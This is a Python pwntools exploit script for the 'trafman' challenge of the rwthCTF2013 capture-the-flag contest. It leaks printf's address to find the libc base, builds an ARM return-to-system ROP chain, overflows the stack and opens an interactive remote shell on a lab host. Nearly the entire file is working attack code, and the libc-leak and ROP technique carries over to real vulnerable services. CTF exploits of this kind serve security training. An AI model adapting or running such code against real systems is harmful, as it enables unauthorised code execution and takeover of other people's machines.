#!/usr/bin/env python2
#Exploit for challenge trafman of rwthCTF2013.
#Create a directory named db next to the trafman binary.
#Execute command nc -c ./trafman -l -p 8000 on remote ARM host(192.168.100.2 for me).
#Pull the libc.so.6 binary from remote to local host.

from pwn import *

io = remote("192.168.100.2", 8000)
bin = ELF("trafman")
libc = ELF("libc.so.6")

io.sendlineafter("Username: ", "traffic_operator")

objectID = "A"*40
#Caculate it: sp lift(0x180) + R4-R7(4*4) - Buffer_start(0x88)
padding = "A"*(0x18c + 4*4 - 0x88)

#Find it in libc.so.6
binsh = 0x000CAA5C

#Find out gadget in libc.so.6, Using ROPgadget now.
#0x000597dc : pop {r0, r4, pc}
pop = 0x000597dc

#Step1: Leak libc base address.
io.sendlineafter("number:\n", "23")
data = io.recvline_startswith(">")
printf_addr = int(data.split(" ")[1][2:], 16)
libc_base = printf_addr - libc.symbols["printf"]

system_addr = libc_base + libc.symbols["system"]
binsh = libc_base + binsh
pop = libc_base + pop
print "[+] leak system() addr: ", hex(system_addr)

#Step2: Build ROP chain. return-to-system.
padding += p32(pop)
padding += p32(binsh)
padding += "AAAA"
padding += p32(system_addr)

#Step3: Execute Command, make a file which length is large than stack.
io.sendlineafter("number:\n", "2")
io.sendlineafter("):\n", objectID)
io.sendlineafter("command:\n", padding)

#Step4: Execute Get Command, triger stack overflow, spawn a shell.
io.sendlineafter("number:\n", "1")
io.sendlineafter("command for:\n", objectID)
io.interactive()

